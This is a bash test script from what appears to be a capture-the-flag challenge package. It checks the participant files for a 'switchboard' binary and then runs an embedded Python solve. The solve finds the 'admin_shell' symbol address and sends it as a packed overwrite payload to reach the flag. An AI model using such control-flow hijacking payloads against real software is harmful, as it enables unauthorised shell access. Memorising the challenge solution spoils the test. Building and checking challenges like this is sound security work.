#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
PARTICIPANT_DIR="$ROOT_DIR/participant_deliverables"
BIN_PATH="$PARTICIPANT_DIR/switchboard"
README_PATH="$PARTICIPANT_DIR/README.md"
SHA_PATH="$PARTICIPANT_DIR/switchboard.sha256"

if [[ ! -f "$BIN_PATH" || ! -f "$README_PATH" || ! -f "$SHA_PATH" ]]; then
    echo "Participant deliverables incomplete."
    echo "Run: make -C $ROOT_DIR/host package"
    exit 1
fi

echo "[test] Checking participant deliverables contain only expected files..."
mapfile -t files < <(find "$PARTICIPANT_DIR" -maxdepth 1 -type f -printf "%f\n" | sort)
expected=("README.md" "switchboard" "switchboard.sha256")

if [[ "${files[*]}" != "${expected[*]}" ]]; then
    echo "[fail] participant_deliverables contents mismatch"
    echo "Found: ${files[*]}"
    echo "Expected: ${expected[*]}"
    exit 1
fi

echo "[ok] participant_deliverables file-set is clean."

echo "[test] Solving from isolated participant-only sandbox..."
SANDBOX_DIR="$(mktemp -d)"
trap 'rm -rf "$SANDBOX_DIR"' EXIT

cp "$BIN_PATH" "$SANDBOX_DIR/switchboard"
cp "$README_PATH" "$SANDBOX_DIR/README.md"
cp "$SHA_PATH" "$SANDBOX_DIR/switchboard.sha256"

(
    cd "$SANDBOX_DIR"
    sha256sum -c switchboard.sha256 >/dev/null

    ADMIN_HEX="$(nm ./switchboard | awk '/ admin_shell$/{print "0x"$1; exit}')"
    if [[ -z "$ADMIN_HEX" ]]; then
        echo "admin_shell symbol not found in sandbox binary"
        exit 1
    fi

    export ADMIN_HEX
    python3 - <<'PY'
import os
import struct
import subprocess
import sys

addr = int(os.environ["ADMIN_HEX"], 16)
payload = struct.pack("<Q", addr) * 2 + b"\n"
script = payload + b"5\n1\n1\n"

completed = subprocess.run(
    ["./switchboard"],
    input=script,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    timeout=10,
    check=False,
)
out = completed.stdout

if b"ZeroSecure_CTF{" not in out or b"[admin] Routed to maintenance shell." not in out:
    sys.stderr.write(out.decode("latin-1", errors="replace"))
    raise SystemExit("sandbox solve markers missing")
PY
)

echo "[ok] Participant-isolated solve passed."
